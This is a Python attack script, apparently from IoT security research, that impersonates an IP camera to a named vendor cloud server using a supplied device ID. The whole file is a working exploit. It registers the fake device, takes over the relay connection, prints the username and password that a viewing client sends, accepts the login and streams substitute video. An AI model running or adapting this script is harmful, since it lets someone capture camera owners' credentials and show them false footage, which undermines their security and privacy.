#!/usr/bin/python3
import socket
import time
import struct
import sys
import threading

# Handles sending back data

DEVICEID = sys.argv[1]
DEVICEMACADDR = '111111111111'
MASTER_SERVER = 'ipc1300.av380.net'
MASTER_PORT = 8877
ADVERTISE_INTERVAL = 4

last_advertise_at = 0
last_advertise_type = 0

master_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

pre_advertise_data1 = '681132303038333131323334333734313100020c17222d0000'
pre_advertise_data1 += bytes(DEVICEID, 'utf-8').hex()
pre_advertise_data1 += '2e6e766476722e6e65740000000000000000000000000000078a1bc0a80105'
pre_advertise_data1 = bytes.fromhex(pre_advertise_data1)
master_sock.sendto(pre_advertise_data1, (MASTER_SERVER, 7788))

pre_advertise_data2 = '2100d1a0c0a801050000000000000000'
pre_advertise_data2 = bytes.fromhex(pre_advertise_data2)
master_sock.sendto(pre_advertise_data2, (MASTER_SERVER, 1341))

pre_advertise_data3 = '2200d1a0c0a801050000000000000000'
pre_advertise_data3 = bytes.fromhex(pre_advertise_data3)
master_sock.sendto(pre_advertise_data3, (MASTER_SERVER, 9001))

def handle_relay_server(relay_ip_addr, relay_port):
    # Connect to relay server and advertise that we are a camera
    print (f'[*] Responding to relay server with device ID: {DEVICEID}.')
    data = '32'
    data += bytes(DEVICEID, 'utf-8').hex()
    data += '2e6e766476722e6e65740000000000000000000000000000302e302e302e30000000000000000000018a1bc4d62f4a41ae000000000000'
    data = bytes.fromhex(data)
    relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    relay_s.sendto(data, (relay_ip_addr, relay_port))

    while True:
        result = relay_s.recvfrom(4096, 0)[0]
        # print (f'[+] Received response from server: {result}') #debugging
        # Check if the result has a username and password
        if result[0] == 0xa7:
            # split out the username and password from the result
            username_start = 8
            password_start = 0x3a
            username = result[username_start:username_start+50].decode('utf-8')
            password = result[password_start:password_start+50].decode('utf-8')
            print (f'\u001b[32m[+] DeviceID: {DEVICEID}')
            print (f'[+] Username: {username}')
            print (f'[+] Password: {password}\u001b[37m')

            # Send correct password packet
            data = 'a800000004000000000000000000000000000000000000000000000000000000b82200009c00000080f81300c0a801092cbb00000000000000000000000002000000000000000000000000000000000000000003000000000000000000000000'
            data = bytes.fromhex(data)
            relay_s.sendto(data, (relay_ip_addr, relay_port))
            #result = relay_s.recvfrom(4096, 0)[0]

        # Stream video data
        elif result[0] == 0xfe:
            video_data = open('video', 'rb').read()
            header = video_data[0:0x80]
            video = video_data[0x80:]
            stream_sock = socket.create_connection((relay_ip_addr, 6010))
            stream_sock.sendall(header, 0)
            time.sleep(2)
            stream_sock.sendall(video, 0)
            time.sleep(400)
        else:
            print (f'\u001b[31m[!] Unknown packet received: {result}.\u001b[37m')
 


while True:
    # print (f'time is: {time.time()} and last time advertised at is: {last_advertise_at}') #debugging
    # Is the current time greater or equal to our advertise interval
    if (time.time() - last_advertise_at) >= ADVERTISE_INTERVAL:
        # Advertise a new camera deviceID and mac addr to the master server
        if last_advertise_type == 0:
            # Send advertise packet
            print (f'[*] Advertise a new camera to master server with device ID: {DEVICEID}.')
            data = '02070032303038333131323334333734313100020c17222d0000'
            data += bytes(DEVICEID, 'utf-8').hex()
            data += '2e6e766476722e6e65740000000000000000000000000000'
            data += bytes(DEVICEMACADDR, 'utf-8').hex()
            data += '8a1bc0a801056762230a93f5d100'
            
        if last_advertise_type in [1, 2, 4, 5]:
            data = '03000000000000000000000000000000'
        
        if last_advertise_type == 3:
            data = '21000000000000000000000000000000'

        data = bytes.fromhex(data)
        master_sock.sendto(data, (MASTER_SERVER, MASTER_PORT))
        last_advertise_at = time.time()
        last_advertise_type += 1

        if last_advertise_type > 5:
            last_advertise_type = 0

    try:
        master_sock.settimeout(1)
        result = (master_sock.recvfrom(4096, 0))[0]
    except socket.timeout:
        continue

    # print (f'Received response from server: {result}') #debugging

    if result[0] == 0xd4:
        # Advertise packet response received from the master server
        pass

    elif result[0] == 0xcd:
        # Bad response
        print (f'\u001b[33m[!] Server does not recognise this device.\u001b[37m')
        exit()

    elif result[0] == 0xcf:
        # Good response and now we need to connect to the relay server\
        start_ip = 33
        end_ip = result.find(b'\x00', start_ip)
        relay_ip_addr = result[start_ip:end_ip].decode('utf-8')
        start_port = 50
        end_port = start_port + 2
        relay_port = result[start_port:end_port]
        relay_port = struct.unpack('<H', relay_port)
        relay_port = relay_port[0]
        print (f'\u001b[32m[+] Valid relay server IP address found: {relay_ip_addr}:{relay_port}\u001b[37m')

        # reflect connect to this relay packet to master server
        master_sock.sendto(result, (MASTER_SERVER, MASTER_PORT))
        data = '28'
        data += bytes(DEVICEID, 'utf-8').hex()
        data += '2e6e766476722e6e6574000000000000000000000000000034372e39312e34322e380000000000000198f98a1b98f92f5b2a0800000000'
        data = bytes.fromhex(data)
        master_sock.sendto(data, (MASTER_SERVER, 1340))

        relay_thread = threading.Thread(target=handle_relay_server, args=(relay_ip_addr, relay_port, ))
        relay_thread.start()
        

